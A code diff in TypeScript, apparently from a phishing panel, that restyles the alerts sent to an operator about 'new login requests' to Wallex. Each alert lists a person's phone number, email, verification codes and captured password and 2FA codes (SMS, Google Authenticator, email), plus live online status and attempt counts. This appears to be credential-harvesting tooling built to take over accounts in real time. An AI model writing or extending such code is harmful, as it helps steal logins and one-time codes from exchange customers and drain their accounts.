@@ -662,7 +662,7 @@ export const showAdminButtons = async (sessionId: string): Promise<boolean> => {
  * Format initial message with all session data
  */
 /**
- * Format session message with all available data (phone, email, codes)
+ * Format session message with all available data (phone, email, codes) in professional boxes
  */
 const formatSessionMessage = (session: UserSession): string => {
   // Escape HTML characters in user data
@@ -675,14 +675,39 @@ const formatSessionMessage = (session: UserSession): string => {
       .replace(/'/g, "&#39;");
   };
 
-  let message = `🔔 <b>درخواست ورود جدید</b>
+  // Helper function to create a professional box
+  const createBox = (
+    title: string,
+    content: string,
+    emoji: string = "📋",
+  ): string => {
+    return `
+╔══════════════════════════════════════╗
+║ ${emoji} <b>${title}</b>
+╠──────────────────────────────────────╢
+║ ${content}
+╚══════════════════════════════════════╝`;
+  };
 
-📱 <b>شماره همراه:</b> <code>${escapeHtml(session.phoneNumber)}</code>
-🆔 <b>Session ID:</b> <code>${escapeHtml(session.sessionId)}</code>
-⏰ <b>زمان شروع:</b> ${escapeHtml(session.startTime)}
-📍 <b>وضعیت فعلی:</b> ${escapeHtml(getCurrentStepText(session.currentStep))}`;
+  // Helper function to create a compact info box
+  const createInfoBox = (items: string[]): string => {
+    const content = items.map((item) => `║ ${item}`).join("\n");
+    return `
+╔══════════════════════════════════════╗
+${content}
+╚══════════════════════════════════════╝`;
+  };
 
-  // Add online status if available
+  // Main header
+  let message = `🚨 <b>درخواست ورود جدید به والکس</b> 🚨
+
+${createBox(
+  "اطلاعات کاربر",
+  `📱 شماره همراه: <code>${escapeHtml(session.phoneNumber)}</code>\n║ 🆔 شناسه نشست: <code>${escapeHtml(session.sessionId.substring(0, 12))}...</code>\n║ 📍 وضعیت: <b>${escapeHtml(getCurrentStepText(session.currentStep))}</b>\n║ ⏰ زمان شروع: ${escapeHtml(session.startTime)}`,
+  "👤",
+)}`;
+
+  // Online status box (if available)
   if (session.onlineStatus) {
     const timeSinceUpdate = Date.now() - session.onlineStatus.lastUpdate;
     const timeAgo =
@@ -690,63 +715,90 @@ const formatSessionMessage = (session: UserSession): string => {
         ? `${Math.floor(timeSinceUpdate / 60000)} دقیقه پیش`
         : `${Math.floor(timeSinceUpdate / 1000)} ثانیه پیش`;
 
-    message += `\n${session.onlineStatus.statusEmoji} <b>وضعیت کاربر:</b> ${escapeHtml(session.onlineStatus.statusText)} (${timeAgo})`;
+    message += `\n${createBox(
+      "وضعیت آنلاین کاربر",
+      `${session.onlineStatus.statusEmoji} <b>${escapeHtml(session.onlineStatus.statusText)}</b>\n║ ⏱️ آخرین فعالیت: ${timeAgo}`,
+      "🌐",
+    )}`;
   }
 
-  // Add email information if exists
-  if (session.email) {
-    message += `\n\n📧 <b>ایمیل:</b> <code>${escapeHtml(session.email)}</code>`;
-  }
-
-  // Add email verification code if exists
-  if (session.emailCode) {
-    message += `\n✅ <b>کد تایید ایمیل:</b> <code>${escapeHtml(session.emailCode)}</code>`;
-  }
-
-  // Add auth codes data with numbered format
-  let hasAnyCodes = false;
-
-  // Check if we have phone verification code
+  // Phone verification code box
   if (session.phoneVerificationCode) {
-    hasAnyCodes = true;
+    message += `\n${createBox(
+      "کد تایید شماره همراه",
+      `✅ <code>${escapeHtml(session.phoneVerificationCode)}</code>`,
+      "📱",
+    )}`;
   }
 
-  // Check if we have auth codes
+  // Email information box
+  if (session.email) {
+    let emailContent = `📧 آدرس ایمیل: <code>${escapeHtml(session.email)}</code>`;
+    if (session.emailCode) {
+      emailContent += `\n║ ✅ کد تایید: <code>${escapeHtml(session.emailCode)}</code>`;
+    } else {
+      emailContent += `\n║ ⏳ در انتظار کد تایید...`;
+    }
+
+    message += `\n${createBox("اطلاعات ایمیل", emailContent, "📧")}`;
+  }
+
+  // Authentication codes boxes - separate box for each type
   if (session.authCodes && Object.keys(session.authCodes).length > 0) {
     Object.keys(session.authCodes).forEach((stepType) => {
       const codes = session.authCodes[stepType];
       if (codes && codes.length > 0) {
-        hasAnyCodes = true;
+        const stepName = getStepDisplayName(stepType);
+        let stepEmoji = "🔐";
+
+        // Choose appropriate emoji based on step type
+        switch (stepType) {
+          case "password":
+            stepEmoji = "🔒";
+            break;
+          case "google":
+            stepEmoji = "📱";
+            break;
+          case "sms":
+            stepEmoji = "💬";
+            break;
+          case "email":
+            stepEmoji = "📧";
+            break;
+        }
+
+        const codesContent = codes
+          .map(
+            (code, index) =>
+              `${index === codes.length - 1 ? "✅" : "📝"} کد ${index + 1}: <code>${escapeHtml(code)}</code>`,
+          )
+          .join("\n║ ");
+
+        message += `\n${createBox(stepName, codesContent, stepEmoji)}`;
       }
     });
   }
 
-  if (hasAnyCodes) {
-    message += `\n\n🔐 <b>کدهای وارد شده:</b>`;
-    let codeNumber = 1;
+  // Summary and statistics box
+  const completedStepsCount = session.completedSteps?.length || 0;
+  const totalAttempts = Object.values(session.authAttempts || {}).reduce(
+    (sum, count) => sum + count,
+    0,
+  );
 
-    // Add phone verification code first
-    if (session.phoneVerificationCode) {
-      message += `\n   ${codeNumber}. <b>کد تایید شماره:</b> <code>${escapeHtml(session.phoneVerificationCode)}</code>`;
-      codeNumber++;
-    }
+  const summaryItems = [
+    `📊 مراحل تکمیل شده: <b>${completedStepsCount}</b>`,
+    `🔄 تعداد تلاش‌ها: <b>${totalAttempts}</b>`,
+    `🕐 آخرین به‌روزرسانی: ${escapeHtml(new Date().toLocaleString("fa-IR"))}`,
+    `⚡ وضعیت سیستم: <b>آماده پردازش</b>`,
+  ];
 
-    // Add auth steps data
-    if (session.authCodes && Object.keys(session.authCodes).length > 0) {
-      Object.keys(session.authCodes).forEach((stepType) => {
-        const codes = session.authCodes[stepType];
-        if (codes && codes.length > 0) {
-          codes.forEach((code) => {
-            message += `\n   ${codeNumber}. <b>${escapeHtml(getStepDisplayName(stepType))}:</b> <code>${escapeHtml(code)}</code>`;
-            codeNumber++;
-          });
-        }
-      });
-    }
-  }
+  message += `\n${createInfoBox(summaryItems)}`;
 
-  message += `\n\n📊 <b>مراحل تکمیل شده:</b> ${session.completedSteps?.length || 0}`;
-  message += `\n🕐 <b>آخرین به‌روزرسانی:</b> ${escapeHtml(new Date().toLocaleString("fa-IR"))}`;
+  // Footer with professional touch
+  message += `\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🛡️ <i>سیستم احراز هویت هوشمند والکس</i>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
 
   return message;
 };
